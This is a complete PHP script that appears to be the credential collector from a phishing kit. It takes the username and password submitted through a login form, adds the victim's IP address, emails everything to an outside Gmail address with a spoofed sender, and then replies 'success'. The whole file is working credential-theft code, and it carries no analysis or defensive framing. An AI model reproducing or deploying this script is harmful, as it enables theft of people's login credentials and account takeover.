<?PHP


# Include message in error page and dump it to the browser

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
 $clientIP = $_SERVER['REMOTE_ADDR'];
}
$FTGusername = $_POST['username'];
$FTGpassword = $_POST['password'];
$emailSubject = "illinois $pam";
  
 $emailBody = "Username : $FTGusername\n"
  . "Password : $FTGpassword\n"
  . "********************************\n"
  . "Sender IP : $clientIP\r\n"
  . "Spectrum Webmasters\n"
  . "********************************\n"
  . "";
  $emailTo = 'fxtoolz489@gmail.com';
  $emailFrom = "info@zauberamc.com.br";
   
  $emailHeader = "From: $emailFrom\n";
  mail($emailTo, $emailSubject, $emailBody, $emailHeader);
  # Include message in the success page and dump it to the browser
# Redirect user to success page

echo 'success';

exit();

?>